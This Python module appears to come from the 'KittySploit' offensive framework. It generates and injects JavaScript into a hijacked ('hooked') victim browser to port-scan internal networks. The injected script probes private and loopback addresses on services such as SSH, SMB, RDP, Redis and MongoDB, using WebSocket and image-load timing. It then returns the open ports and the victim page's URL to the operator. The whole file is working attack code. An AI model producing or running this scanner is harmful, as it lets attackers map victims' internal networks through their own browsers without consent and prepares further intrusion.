from kittysploit import *
import json
import ipaddress
import re


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Internal Port Scan",
		"description": "Probe internal hosts/ports from the hooked browser (Image/WebSocket/fetch timing)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	targets = OptString(
		"127.0.0.1,192.168.1.1,192.168.0.1,10.0.0.1",
		"Comma-separated hosts or CIDR (e.g. 192.168.1.0/29)",
		False,
	)
	ports = OptString(
		"80,443,8080,8443,8000,3000,5000,22,445,3389,5900,6379,27017,9200,5601",
		"Comma-separated TCP ports to probe",
		False,
	)
	timeout_ms = OptInteger(900, "Per-probe timeout in milliseconds", False)
	concurrency = OptInteger(6, "Max parallel probes in the browser", False)
	max_hosts = OptInteger(32, "Safety cap on expanded host list", False)

	def _expand_targets(self, raw: str, max_hosts: int):
		hosts = []
		seen = set()
		for part in re.split(r"[,\s]+", str(raw or "").strip()):
			if not part:
				continue
			if "/" in part:
				try:
					network = ipaddress.ip_network(part, strict=False)
					for ip in network.hosts():
						host = str(ip)
						if host not in seen:
							seen.add(host)
							hosts.append(host)
						if len(hosts) >= max_hosts:
							return hosts, True
				except ValueError:
					print_warning(f"Skipping invalid CIDR: {part}")
				continue
			if part not in seen:
				seen.add(part)
				hosts.append(part)
			if len(hosts) >= max_hosts:
				return hosts, True
		return hosts, False

	def run(self):
		max_hosts = max(1, int(self.max_hosts or 32))
		hosts, truncated = self._expand_targets(self.targets, max_hosts)
		if not hosts:
			print_error("No valid targets")
			return False

		ports = []
		for part in str(self.ports or "").split(","):
			part = part.strip()
			if not part:
				continue
			try:
				port = int(part)
			except ValueError:
				print_warning(f"Skipping invalid port: {part}")
				continue
			if 1 <= port <= 65535 and port not in ports:
				ports.append(port)

		if not ports:
			print_error("No valid ports")
			return False

		timeout_ms = max(200, int(self.timeout_ms or 900))
		concurrency = max(1, min(20, int(self.concurrency or 6)))
		total = len(hosts) * len(ports)
		# Worst-case wall time estimate with concurrency
		est_s = max(8, int((total * timeout_ms) / (concurrency * 1000)) + 15)

		if truncated:
			print_warning(f"Host list truncated to {max_hosts} (max_hosts)")

		print_status(
			f"Scanning {len(hosts)} host(s) x {len(ports)} port(s) = {total} probe(s) "
			f"(timeout={timeout_ms}ms, concurrency={concurrency})"
		)

		hosts_js = json.dumps(hosts)
		ports_js = json.dumps(ports)

		code_js = f"""
		(function() {{
			const HOSTS = {hosts_js};
			const PORTS = {ports_js};
			const TIMEOUT_MS = {timeout_ms};
			const CONCURRENCY = {concurrency};

			function probe(host, port) {{
				return new Promise(function(resolve) {{
					const started = Date.now();
					const urlHttp = 'http://' + host + ':' + port + '/';
					let settled = false;

					function done(state, method, detail) {{
						if (settled) return;
						settled = true;
						resolve({{
							host: host,
							port: port,
							state: state,
							method: method,
							detail: detail || null,
							elapsed_ms: Date.now() - started
						}});
					}}

					// Prefer WebSocket: open/error often distinguishes listening sockets faster than img.
					let ws;
					try {{
						ws = new WebSocket('ws://' + host + ':' + port);
						ws.onopen = function() {{
							try {{ ws.close(); }} catch (e) {{}}
							done('open', 'websocket', 'onopen');
						}};
						ws.onerror = function() {{
							// error alone is ambiguous; wait for timeout unless img confirms
						}};
					}} catch (e) {{
						ws = null;
					}}

					const img = new Image();
					img.onload = function() {{
						if (ws) {{ try {{ ws.close(); }} catch (e) {{}} }}
						done('open', 'image', 'onload');
					}};
					img.onerror = function() {{
						// Connection refused vs open-but-not-HTTP both fire onerror in many browsers.
						// Treat quick onerror after WS activity as likely open HTTP-ish endpoint.
						const elapsed = Date.now() - started;
						if (elapsed < Math.min(400, TIMEOUT_MS * 0.5)) {{
							if (ws) {{ try {{ ws.close(); }} catch (e) {{}} }}
							done('open', 'image', 'fast-onerror');
						}}
					}};
					try {{
						img.src = urlHttp + 'favicon.ico?_ks=' + Date.now() + Math.random();
					}} catch (e) {{}}

					setTimeout(function() {{
						if (ws) {{
							try {{ ws.close(); }} catch (e) {{}}
						}}
						try {{ img.src = ''; }} catch (e) {{}}
						done('closed_or_filtered', 'timeout', null);
					}}, TIMEOUT_MS);
				}});
			}}

			function runPool(jobs, worker) {{
				return new Promise(function(resolve) {{
					const results = [];
					let idx = 0;
					let active = 0;

					function next() {{
						while (active < CONCURRENCY && idx < jobs.length) {{
							const job = jobs[idx++];
							active++;
							worker(job.host, job.port).then(function(res) {{
								results.push(res);
								active--;
								if (results.length === jobs.length) {{
									resolve(results);
								}} else {{
									next();
								}}
							}});
						}}
					}}
					if (jobs.length === 0) {{
						resolve([]);
						return;
					}}
					next();
				}});
			}}

			const jobs = [];
			HOSTS.forEach(function(h) {{
				PORTS.forEach(function(p) {{
					jobs.push({{ host: h, port: p }});
				}});
			}});

			return runPool(jobs, probe).then(function(results) {{
				const open = results.filter(function(r) {{ return r.state === 'open'; }});
				return JSON.stringify({{
					ok: true,
					origin: window.location.origin,
					page_url: window.location.href,
					total: results.length,
					open_count: open.length,
					open: open,
					results: results
				}});
			}});
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=float(est_s))
		if not result:
			print_error("Failed to run internal port scan")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse port scan response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		print_info("=" * 60)
		print_info("Internal Port Scan")
		print_info(f"  Page origin: {data.get('origin', '?')}")
		print_info(f"  Probes: {data.get('total', 0)}")
		open_hits = data.get("open") or []
		if not open_hits:
			print_status("  No likely-open ports detected (or browser filtered probes)")
			print_info("  Note: browser port scanning is heuristic; false negatives are common")
			return True

		print_warning(f"  Likely open: {len(open_hits)}")
		print_info("-" * 60)
		for hit in sorted(open_hits, key=lambda x: (x.get("host", ""), int(x.get("port") or 0))):
			print_success(
				f"  {hit.get('host')}:{hit.get('port')}  "
				f"[{hit.get('method')}/{hit.get('detail')}]  {hit.get('elapsed_ms')}ms"
			)

		return True
